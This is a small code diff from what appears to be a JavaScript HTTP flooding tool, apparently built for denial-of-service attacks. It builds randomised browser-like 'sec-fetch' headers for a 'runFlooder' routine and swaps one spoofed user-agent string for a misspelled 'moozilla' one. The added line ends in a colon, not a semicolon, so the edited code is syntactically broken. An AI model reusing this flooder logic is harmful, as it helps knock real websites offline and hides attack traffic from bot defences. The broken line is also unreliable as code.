@@ -255,7 +255,7 @@ HTTP(options, callback) {
  headers["sec-fetch-site"] = site_header[Math.floor(Math.random() * site_header.length)];
  headers["sec-fetch-user"] = "?1";
  headers["upgrade-insecure-requests"] = "1";
- headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0";
+ headers["user-agent"] = "moozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36":
  headers["x-requested-with"] = "XMLHttpRequest";
 
  function runFlooder() {
